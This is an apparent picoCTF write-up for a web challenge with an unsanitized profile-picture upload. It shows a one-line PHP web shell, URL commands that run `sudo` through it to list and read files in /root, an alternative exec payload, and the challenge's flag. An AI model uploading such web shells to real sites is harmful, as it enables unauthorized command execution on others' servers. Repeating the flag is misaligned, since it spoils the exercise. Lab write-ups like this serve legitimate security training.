# Problem
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, presenting an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.  
**Hint 1:** File upload is not sanitized  
**Hint 2:** Whenever you get a shell on a remote machine, check `sudo -l`

# Solution
As mentioned in the challenge, the file upload isn't sanitized, so let's build a PHP payload for access. You can use any editor (e.g., nano, mousepad).

```bash
gedit test.php
```

Put this code inside:

```php
<?php system($_GET['cmd']); ?>
```

Upload it and check for a successful message. Once received, add `/uploads/test.php?cmd=sudo -l` to the URL; this will show that no password is needed for using sudo in this challenge.  
Use `/uploads/test.php?cmd=sudo ls /root` to list files in the root directory (i.e., `flag.txt`).  
You can extract it using `/uploads/test.php?cmd=sudo cat /root/flag.txt`.

Alternatively, you can replace the payload with:

```php
<?php echo exec('sudo cat /root/flag.txt'); ?>
```

Upload this payload, then just navigate to `/uploads/test.php`; this will give you the flag.

Flag: `picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`
